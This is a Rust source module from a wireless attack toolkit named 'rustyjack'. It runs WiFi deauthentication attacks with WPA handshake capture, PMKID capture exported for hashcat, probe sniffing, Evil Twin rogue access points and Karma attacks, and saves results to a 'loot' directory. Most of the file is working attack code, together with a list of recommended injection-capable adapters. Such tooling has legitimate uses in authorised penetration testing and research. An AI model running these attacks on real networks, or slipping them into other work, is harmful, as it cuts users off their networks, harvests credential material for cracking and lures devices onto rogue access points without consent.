//! Native Rust wireless operations module
//!
//! This module provides pure Rust implementations of wireless security operations
//! using the `rustyjack-wireless` crate. No external tools (aircrack-ng, etc.) are used.

use anyhow::{bail, Result};
use serde_json::Value;
use std::path::{Path, PathBuf};

#[cfg(target_os = "linux")]
use anyhow::Context;
#[cfg(target_os = "linux")]
use chrono::Local;
#[cfg(target_os = "linux")]
use std::fs;
#[cfg(target_os = "linux")]
use std::time::Duration;

/// Result of a deauthentication attack
#[derive(Debug, Clone)]
pub struct DeauthResult {
    pub bssid: String,
    pub ssid: Option<String>,
    pub channel: u8,
    pub packets_sent: u64,
    pub bursts: u32,
    pub duration_secs: u64,
    pub handshake_captured: bool,
    pub handshake_file: Option<PathBuf>,
    pub capture_files: Vec<PathBuf>,
    pub log_file: PathBuf,
    pub eapol_frames: u64,
}

impl DeauthResult {
    pub fn to_json(&self) -> Value {
        let log_value = if self.log_file.as_os_str().is_empty() {
            serde_json::Value::Null
        } else {
            serde_json::Value::String(self.log_file.display().to_string())
        };
        serde_json::json!({
            "bssid": self.bssid,
            "ssid": self.ssid,
            "channel": self.channel,
            "packets_sent": self.packets_sent,
            "bursts": self.bursts,
            "duration_secs": self.duration_secs,
            "handshake_captured": self.handshake_captured,
            "handshake_file": self.handshake_file.as_ref().map(|p| p.display().to_string()),
            "capture_files": self.capture_files.iter().map(|p| p.display().to_string()).collect::<Vec<_>>(),
            "log_file": log_value,
            "eapol_frames": self.eapol_frames,
        })
    }
}

/// Configuration for a deauthentication attack
#[derive(Debug, Clone)]
pub struct DeauthConfig {
    pub bssid: String,
    pub ssid: Option<String>,
    pub channel: u8,
    pub interface: String,
    pub client: Option<String>,
    pub packets: u32,
    pub duration: u32,
    pub interval: u32,
    pub continuous: bool,
}

/// Check if native wireless library is available (requires root on Linux)
#[cfg(target_os = "linux")]
pub fn native_available() -> bool {
    unsafe { libc::geteuid() == 0 }
}

#[cfg(not(target_os = "linux"))]
pub fn native_available() -> bool {
    false
}

/// Check if the interface is wireless
pub fn is_wireless_interface(interface: &str) -> bool {
    let path = format!("/sys/class/net/{}/wireless", interface);
    std::path::Path::new(&path).exists()
}

/// Execute a deauthentication attack using native Rust implementation
#[cfg(target_os = "linux")]
pub fn execute_deauth_attack(
    loot_dir: &Path,
    config: &DeauthConfig,
    on_progress: impl Fn(f32, &str),
) -> Result<DeauthResult> {
    use rustyjack_wireless::{
        DeauthAttacker, DeauthConfig as NativeDeauthConfig, DeauthReason, WirelessInterface,
    };

    tracing::info!(
        "Starting native Rust deauth attack on BSSID: {}",
        config.bssid
    );
    on_progress(0.02, "Validating configuration...");

    // Validate interface is wireless
    if !is_wireless_interface(&config.interface) {
        bail!("Interface {} is not a wireless interface", config.interface);
    }

    // Parse BSSID
    let bssid: rustyjack_wireless::MacAddress =
        config.bssid.parse().context("Invalid BSSID format")?;

    // Parse optional client MAC
    let client: Option<rustyjack_wireless::MacAddress> = if let Some(ref c) = config.client {
        Some(c.parse().context("Invalid client MAC format")?)
    } else {
        None
    };

    // Generate output filenames with timestamp
    let timestamp = Local::now().format("%Y%m%d_%H%M%S");
    let ssid_display = config.ssid.clone().unwrap_or_else(|| config.bssid.clone());
    let safe_ssid =
        ssid_display.replace(|c: char| !c.is_alphanumeric() && c != '-' && c != '_', "_");
    // Create loot directory for captures
    fs::create_dir_all(loot_dir)
        .with_context(|| format!("Creating loot directory: {}", loot_dir.display()))?;
    let logging_enabled = crate::logs_enabled();
    let log_file = if logging_enabled {
        let logs_dir = loot_dir.join("logs");
        fs::create_dir_all(&logs_dir)
            .with_context(|| format!("Creating logs directory: {}", logs_dir.display()))?;
        logs_dir.join(format!("log_deauth_{}_{}.txt", safe_ssid, timestamp))
    } else {
        PathBuf::new()
    };
    let capture_file = loot_dir.join(format!("handshake_{}_{}.pcap", safe_ssid, timestamp));

    on_progress(0.05, "Initializing wireless interface...");

    // Setup interface in monitor mode
    let mut iface =
        WirelessInterface::new(&config.interface).context("Failed to open wireless interface")?;

    on_progress(0.10, "Enabling monitor mode...");
    iface.set_monitor_mode().context(
        "Failed to enable monitor mode. Ensure adapter supports monitor mode and injection.",
    )?;

    on_progress(0.15, &format!("Setting channel {}...", config.channel));
    iface
        .set_channel(config.channel)
        .context("Failed to set channel")?;

    // Create native deauth config
    let native_config = NativeDeauthConfig {
        packets_per_burst: config.packets,
        duration: Duration::from_secs(config.duration as u64),
        burst_interval: Duration::from_secs(config.interval as u64),
        reason: DeauthReason::Class3FromNonAssoc,
        bidirectional: true,
        include_disassoc: false,
        capture_handshake: true,
        stop_on_handshake: true,
    };

    on_progress(0.20, "Starting deauth attack with capture...");

    // Create attacker and execute with capture
    let mut attacker = DeauthAttacker::new(&iface).context("Failed to create deauth attacker")?;

    let (stats, captured_packets, handshake_export) = attacker
        .attack_with_capture(bssid, client, native_config)
        .context("Deauth attack failed")?;

    on_progress(0.90, "Saving capture data...");

    // Save captured packets to pcap file
    let mut capture_files = Vec::new();
    if !captured_packets.is_empty() {
        // Write packets to a simple capture format
        let mut pcap_data = Vec::new();
        for pkt in &captured_packets {
            pcap_data.extend_from_slice(&pkt.raw_data);
        }
        if !pcap_data.is_empty() {
            fs::write(&capture_file, &pcap_data)
                .with_context(|| format!("Writing capture file: {}", capture_file.display()))?;
            capture_files.push(capture_file.clone());
        }
    }

    if let Some(export) = handshake_export {
        let export_bundle = serde_json::json!({
            "ssid": ssid_display,
            "handshake": export,
        });
        let export_file =
            loot_dir.join(format!("handshake_export_{}_{}.json", safe_ssid, timestamp));
        fs::write(&export_file, serde_json::to_vec_pretty(&export_bundle)?)
            .with_context(|| format!("Writing handshake export: {}", export_file.display()))?;
        capture_files.push(export_file);
    }

    on_progress(0.95, "Restoring interface...");

    // Cleanup - restore managed mode
    if let Err(e) = iface.set_managed_mode() {
        tracing::warn!("Failed to restore managed mode: {}", e);
    }

    // Write detailed log file when logging is enabled
    if logging_enabled {
        let mut log_content = String::new();
        log_content.push_str("====================================================\n");
        log_content.push_str("    RUSTYJACK NATIVE DEAUTHENTICATION ATTACK LOG   \n");
        log_content.push_str("====================================================\n\n");
        log_content.push_str(&format!(
            "Timestamp: {}\n",
            Local::now().format("%Y-%m-%d %H:%M:%S")
        ));
        log_content.push_str("Implementation: Native Rust (rustyjack-wireless)\n\n");
        log_content.push_str("--- TARGET INFORMATION ----------------------------\n");
        log_content.push_str(&format!("Target BSSID: {}\n", config.bssid));
        log_content.push_str(&format!("Target SSID: {}\n", ssid_display));
        log_content.push_str(&format!("Target Channel: {}\n", config.channel));
        log_content.push_str(&format!("Interface: {}\n", config.interface));
        if let Some(ref c) = config.client {
            log_content.push_str(&format!("Target Client: {}\n", c));
        } else {
            log_content.push_str("Target Client: Broadcast (all clients)\n");
        }
        log_content.push_str("\n--- ATTACK CONFIGURATION --------------------------\n");
        log_content.push_str(&format!("Duration: {} seconds\n", config.duration));
        log_content.push_str(&format!("Packets per burst: {}\n", config.packets));
        log_content.push_str(&format!("Burst interval: {} seconds\n", config.interval));
        log_content.push_str(&format!("Continuous mode: {}\n", config.continuous));
        log_content.push_str("\n--- ATTACK RESULTS --------------------------------\n");
        log_content.push_str(&format!(
            "Attack Duration: {:.1} seconds\n",
            stats.duration.as_secs_f32()
        ));
        log_content.push_str(&format!("Total bursts: {}\n", stats.bursts));
        log_content.push_str(&format!("Total packets sent: {}\n", stats.packets_sent));
        log_content.push_str(&format!("Failed packets: {}\n", stats.failed_packets));
        log_content.push_str(&format!("Bytes sent: {}\n", stats.bytes_sent));
        log_content.push_str(&format!(
            "Packets/second: {:.1}\n",
            stats.packets_per_second()
        ));
        log_content.push_str(&format!("EAPOL frames captured: {}\n", stats.eapol_frames));
        log_content.push_str("\n====================================================\n");
        log_content.push_str(&format!(
            "HANDSHAKE CAPTURED: {}\n",
            if stats.handshake_captured {
                "YES"
            } else {
                "NO"
            }
        ));
        log_content.push_str("====================================================\n\n");

        if !capture_files.is_empty() {
            log_content.push_str("Capture files:\n");
            for file in &capture_files {
                log_content.push_str(&format!("  - {}\n", file.display()));
            }
        }

        fs::write(&log_file, &log_content)
            .with_context(|| format!("Writing log file: {}", log_file.display()))?;
    }

    on_progress(1.0, "Complete");

    Ok(DeauthResult {
        bssid: config.bssid.clone(),
        ssid: config.ssid.clone(),
        channel: config.channel,
        packets_sent: stats.packets_sent,
        bursts: stats.bursts,
        duration_secs: stats.duration.as_secs(),
        handshake_captured: stats.handshake_captured,
        handshake_file: if stats.handshake_captured {
            capture_files.first().cloned()
        } else {
            None
        },
        capture_files,
        log_file,
        eapol_frames: stats.eapol_frames,
    })
}

#[cfg(not(target_os = "linux"))]
pub fn execute_deauth_attack(
    _loot_dir: &Path,
    _config: &DeauthConfig,
    _on_progress: impl Fn(f32, &str),
) -> Result<DeauthResult> {
    bail!("Native wireless operations require Linux. This platform is not supported.")
}

/// Information about wireless capabilities
#[derive(Debug, Clone)]
pub struct WirelessCapabilities {
    pub native_available: bool,
    pub has_root: bool,
    pub interface_exists: bool,
    pub interface_is_wireless: bool,
    pub supports_monitor_mode: bool,
    pub supports_injection: bool,
}

impl WirelessCapabilities {
    pub fn is_attack_capable(&self) -> bool {
        self.native_available
            && self.has_root
            && self.interface_is_wireless
            && self.supports_monitor_mode
    }
}

#[cfg(target_os = "linux")]
fn interface_wiphy(interface: &str) -> Option<u32> {
    let mut mgr = rustyjack_netlink::WirelessManager::new().ok()?;
    let info = mgr.get_interface_info(interface).ok()?;
    Some(info.wiphy)
}

/// Check system wireless capabilities for a given interface
#[cfg(target_os = "linux")]
pub fn check_capabilities(interface: &str) -> WirelessCapabilities {
    let has_root = unsafe { libc::geteuid() == 0 };
    let interface_exists = std::path::Path::new(&format!("/sys/class/net/{}", interface)).exists();
    let interface_is_wireless = is_wireless_interface(interface);

    // Check monitor mode support via nl80211
    let mut supports_monitor = false;
    if interface_exists && interface_is_wireless {
        if let Some(_phy) = interface_wiphy(interface) {
            if let Ok(mut mgr) = rustyjack_netlink::WirelessManager::new() {
                if let Ok(caps) = mgr.get_phy_capabilities(interface) {
                    supports_monitor = caps.supports_monitor;
                }
            }
        }
    }

    WirelessCapabilities {
        native_available: true,
        has_root,
        interface_exists,
        interface_is_wireless,
        supports_monitor_mode: supports_monitor,
        supports_injection: supports_monitor, // Assume injection if monitor is supported
    }
}

#[cfg(not(target_os = "linux"))]
pub fn check_capabilities(_interface: &str) -> WirelessCapabilities {
    WirelessCapabilities {
        native_available: false,
        has_root: false,
        interface_exists: false,
        interface_is_wireless: false,
        supports_monitor_mode: false,
        supports_injection: false,
    }
}

/// Known injection-capable chipsets
pub const INJECTION_CAPABLE_CHIPSETS: &[&str] = &[
    "AR9271",    // Atheros - most compatible
    "AR9287",    // Atheros
    "RTL8187",   // Realtek - older but works
    "RTL8812AU", // Realtek - 5GHz support
    "RTL8814AU", // Realtek - high power
    "RT3070",    // Ralink
    "RT3572",    // Ralink - dual band
    "RT5370",    // Ralink
    "RT5572",    // Ralink - dual band
    "MT7612U",   // Mediatek - good 5GHz
    "MT7610U",   // Mediatek
];

/// Recommended adapters for purchase
pub const RECOMMENDED_ADAPTERS: &[(&str, &str)] = &[
    ("Alfa AWUS036ACH", "RTL8812AU - Excellent 5GHz, high power"),
    ("Alfa AWUS036NHA", "AR9271 - Best 2.4GHz compatibility"),
    ("Panda PAU09", "RTL8814AU - Dual band, good range"),
    ("TP-Link TL-WN722N v1", "AR9271 - Budget option (v1 only!)"),
];

/// Result of a PMKID capture operation
#[derive(Debug, Clone)]
pub struct PmkidResult {
    pub interface: String,
    pub duration_secs: u64,
    pub pmkids_captured: usize,
    pub networks_seen: usize,
    pub loot_path: PathBuf,
    pub hashcat_file: Option<PathBuf>,
}

/// Configuration for PMKID capture
#[derive(Debug, Clone)]
pub struct PmkidCaptureConfig {
    pub interface: String,
    pub channel: u8,
    pub target_bssid: Option<String>,
    pub duration_secs: u32,
}

/// Execute PMKID capture using native Rust implementation
#[cfg(target_os = "linux")]
pub fn execute_pmkid_capture(
    loot_dir: &Path,
    config: &PmkidCaptureConfig,
    on_progress: impl Fn(f32, &str) + Send + 'static,
) -> Result<PmkidResult> {
    use rustyjack_wireless::{execute_pmkid_capture as native_pmkid, PmkidConfig};

    tracing::info!("Starting native PMKID capture on {}", config.interface);
    on_progress(0.05, "Initializing PMKID capture...");

    // Validate interface
    if !is_wireless_interface(&config.interface) {
        bail!("Interface {} is not a wireless interface", config.interface);
    }

    // Build native config - using the actual API
    let native_config = PmkidConfig {
        interface: config.interface.clone(),
        bssid: config.target_bssid.clone(),
        ssid: None,
        channel: config.channel,
        duration: config.duration_secs,
    };

    on_progress(0.10, "Starting capture...");

    // Execute capture - actual API: (loot_dir, config, callback)
    let result = native_pmkid(loot_dir, &native_config, |progress, msg| {
        on_progress(progress, msg);
    })
    .context("PMKID capture failed")?;

    on_progress(1.0, "PMKID capture complete");

    Ok(PmkidResult {
        interface: config.interface.clone(),
        duration_secs: config.duration_secs as u64,
        pmkids_captured: result.pmkids_captured,
        networks_seen: result.captures.len(),
        loot_path: loot_dir.to_path_buf(),
        hashcat_file: result.hashcat_file,
    })
}

#[cfg(not(target_os = "linux"))]
pub fn execute_pmkid_capture(
    _loot_dir: &Path,
    _config: &PmkidCaptureConfig,
    _on_progress: impl Fn(f32, &str),
) -> Result<PmkidResult> {
    bail!("PMKID capture requires Linux.")
}

/// Result of a probe sniff operation
#[derive(Debug, Clone)]
pub struct ProbeSniffResult {
    pub interface: String,
    pub duration_secs: u64,
    pub probes_captured: usize,
    pub unique_clients: usize,
    pub unique_networks: usize,
    pub loot_path: PathBuf,
}

/// Configuration for probe sniffing
#[derive(Debug, Clone)]
pub struct ProbeSniffConfig {
    pub interface: String,
    pub channel: u8,
    pub duration_secs: u32,
}

/// Execute probe sniffing using native Rust implementation
#[cfg(target_os = "linux")]
pub fn execute_probe_sniff(
    loot_dir: &Path,
    config: &ProbeSniffConfig,
    on_progress: impl Fn(f32, &str) + Send + 'static,
) -> Result<ProbeSniffResult> {
    use rustyjack_wireless::{
        execute_probe_sniff as native_probe, ProbeSniffConfig as NativeProbeConfig,
    };

    tracing::info!("Starting probe sniff on {}", config.interface);
    on_progress(0.05, "Initializing probe sniffer...");

    if !is_wireless_interface(&config.interface) {
        bail!("Interface {} is not a wireless interface", config.interface);
    }

    // Build native config - using the actual API
    let native_config = NativeProbeConfig {
        interface: config.interface.clone(),
        duration: config.duration_secs,
        channel: config.channel,
    };

    on_progress(0.10, "Starting probe capture...");

    // Execute capture - actual API: (loot_dir, config, callback)
    let result = native_probe(loot_dir, &native_config, |progress, msg| {
        on_progress(progress, msg);
    })
    .context("Probe sniff failed")?;

    on_progress(1.0, "Probe sniff complete");

    Ok(ProbeSniffResult {
        interface: config.interface.clone(),
        duration_secs: config.duration_secs as u64,
        probes_captured: result.total_probes as usize,
        unique_clients: result.unique_clients as usize,
        unique_networks: result.unique_networks as usize,
        loot_path: loot_dir.to_path_buf(),
    })
}

#[cfg(not(target_os = "linux"))]
pub fn execute_probe_sniff(
    _loot_dir: &Path,
    _config: &ProbeSniffConfig,
    _on_progress: impl Fn(f32, &str),
) -> Result<ProbeSniffResult> {
    bail!("Probe sniffing requires Linux.")
}

/// Result of an Evil Twin attack
#[derive(Debug, Clone)]
pub struct EvilTwinResult {
    pub ssid: String,
    pub channel: u8,
    pub duration_secs: u64,
    pub clients_connected: u32,
    pub handshakes_captured: u32,
    pub loot_path: PathBuf,
}

/// Configuration for Evil Twin attack
#[derive(Debug, Clone)]
pub struct EvilTwinAttackConfig {
    pub ssid: String,
    pub channel: u8,
    pub ap_interface: String,
    pub deauth_interface: Option<String>,
    pub target_bssid: Option<String>,
    pub duration_secs: u32,
    pub open_network: bool,
    pub wpa_password: Option<String>,
}

/// Execute Evil Twin attack using native Rust implementation
#[cfg(target_os = "linux")]
pub fn execute_evil_twin(
    loot_dir: &Path,
    config: &EvilTwinAttackConfig,
    on_progress: impl Fn(f32, &str) + Send + Sync + 'static,
) -> Result<EvilTwinResult> {
    use rustyjack_wireless::{execute_evil_twin as native_evil_twin, EvilTwinConfig};
    use std::sync::Arc;
    use std::time::Duration;

    tracing::info!("Starting Evil Twin attack for SSID: {}", config.ssid);

    // Wrap on_progress in Arc for sharing
    let on_progress = Arc::new(on_progress);
    on_progress(0.05, "Checking requirements...");

    // Check for required tools
    let missing = rustyjack_wireless::EvilTwin::check_requirements()
        .context("Failed to check requirements")?;
    if !missing.is_empty() {
        bail!("Missing required tools: {}", missing.join(", "));
    }

    // Parse target BSSID if provided
    let target_bssid = if let Some(ref bssid_str) = config.target_bssid {
        Some(bssid_str.parse().context("Invalid target BSSID")?)
    } else {
        None
    };

    let native_config = EvilTwinConfig {
        ssid: config.ssid.clone(),
        channel: config.channel,
        ap_interface: config.ap_interface.clone(),
        deauth_interface: config.deauth_interface.clone(),
        target_bssid,
        simultaneous_deauth: config.deauth_interface.is_some(),
        deauth_interval: Duration::from_secs(5),
        duration: Duration::from_secs(config.duration_secs as u64),
        open_network: config.open_network,
        wpa_password: config.wpa_password.clone(),
        capture_path: loot_dir.to_string_lossy().to_string(),
    };

    on_progress(0.10, "Starting Evil Twin AP...");

    let progress_clone = Arc::clone(&on_progress);
    let result = native_evil_twin(
        native_config,
        Some(loot_dir.to_str().unwrap_or("loot/Wireless")),
        move |msg| {
            progress_clone(0.50, msg);
        },
    )
    .context("Evil Twin attack failed")?;

    on_progress(1.0, "Evil Twin attack complete");

    Ok(EvilTwinResult {
        ssid: config.ssid.clone(),
        channel: config.channel,
        duration_secs: result.stats.duration.as_secs(),
        clients_connected: result.stats.clients_connected,
        handshakes_captured: result.stats.handshakes_captured,
        loot_path: result.loot_path,
    })
}

#[cfg(not(target_os = "linux"))]
pub fn execute_evil_twin(
    _loot_dir: &Path,
    _config: &EvilTwinAttackConfig,
    _on_progress: impl Fn(f32, &str),
) -> Result<EvilTwinResult> {
    bail!("Evil Twin attack requires Linux.")
}

/// Result of a Karma attack
#[derive(Debug, Clone)]
pub struct KarmaResult {
    pub interface: String,
    pub duration_secs: u64,
    pub probes_seen: u64,
    pub unique_ssids: usize,
    pub unique_clients: usize,
    pub victims: usize,
    pub loot_path: PathBuf,
}

/// Configuration for Karma attack
#[derive(Debug, Clone)]
pub struct KarmaAttackConfig {
    pub interface: String,
    pub ap_interface: Option<String>,
    pub channel: u8,
    pub duration_secs: u32,
    pub with_ap: bool,
    pub ssid_whitelist: Vec<String>,
    pub ssid_blacklist: Vec<String>,
}

/// Execute Karma attack using native Rust implementation
#[cfg(target_os = "linux")]
pub fn execute_karma(
    loot_dir: &Path,
    config: &KarmaAttackConfig,
    on_progress: impl Fn(f32, &str) + Send + Sync + 'static,
) -> Result<KarmaResult> {
    use rustyjack_wireless::{execute_karma as native_karma, execute_karma_with_ap, KarmaConfig};
    use std::sync::Arc;

    tracing::info!("Starting Karma attack on {}", config.interface);

    // Wrap on_progress in Arc for sharing
    let on_progress = Arc::new(on_progress);
    on_progress(0.05, "Initializing Karma attack...");

    if !is_wireless_interface(&config.interface) {
        bail!("Interface {} is not a wireless interface", config.interface);
    }

    let native_config = KarmaConfig {
        interface: config.interface.clone(),
        duration: config.duration_secs,
        channel: config.channel,
        ssid_whitelist: config.ssid_whitelist.clone(),
        ssid_blacklist: config.ssid_blacklist.clone(),
        target_clients: Vec::new(),
        capture_handshakes: true,
        log_probes: true,
        output_dir: loot_dir.to_path_buf(),
        stealth_mac: false,
    };

    on_progress(0.10, "Starting Karma capture...");

    let result = if config.with_ap {
        let ap_iface = config.ap_interface.as_deref().unwrap_or(&config.interface);
        let progress_clone = Arc::clone(&on_progress);
        execute_karma_with_ap(
            native_config,
            ap_iface,
            Some(loot_dir.to_str().unwrap_or("loot/Wireless")),
            move |msg| {
                progress_clone(0.50, msg);
            },
        )
        .context("Karma AP attack failed")?
    } else {
        let progress_clone = Arc::clone(&on_progress);
        native_karma(
            native_config,
            Some(loot_dir.to_str().unwrap_or("loot/Wireless")),
            move |msg| {
                progress_clone(0.50, msg);
            },
        )
        .context("Karma attack failed")?
    };

    on_progress(1.0, "Karma attack complete");

    Ok(KarmaResult {
        interface: config.interface.clone(),
        duration_secs: config.duration_secs as u64,
        probes_seen: result.result.stats.probes_seen,
        unique_ssids: result.result.stats.unique_ssids,
        unique_clients: result.result.stats.unique_clients,
        victims: result.result.stats.victims,
        loot_path: result.loot_path,
    })
}

#[cfg(not(target_os = "linux"))]
pub fn execute_karma(
    _loot_dir: &Path,
    _config: &KarmaAttackConfig,
    _on_progress: impl Fn(f32, &str),
) -> Result<KarmaResult> {
    bail!("Karma attack requires Linux.")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_deauth_result_to_json() {
        let result = DeauthResult {
            bssid: "AA:BB:CC:DD:EE:FF".to_string(),
            ssid: Some("TestNetwork".to_string()),
            channel: 6,
            packets_sent: 1000,
            bursts: 10,
            duration_secs: 60,
            handshake_captured: true,
            handshake_file: Some(PathBuf::from("/tmp/test.pcap")),
            capture_files: vec![PathBuf::from("/tmp/test.pcap")],
            log_file: PathBuf::from("/tmp/test.log"),
            eapol_frames: 4,
        };

        let json = result.to_json();
        assert_eq!(json["bssid"], "AA:BB:CC:DD:EE:FF");
        assert_eq!(json["handshake_captured"], true);
    }

    #[test]
    fn test_capabilities() {
        let caps = check_capabilities("wlan0");
        // Just verify it doesn't panic
        let _ = caps.is_attack_capable();
    }
}
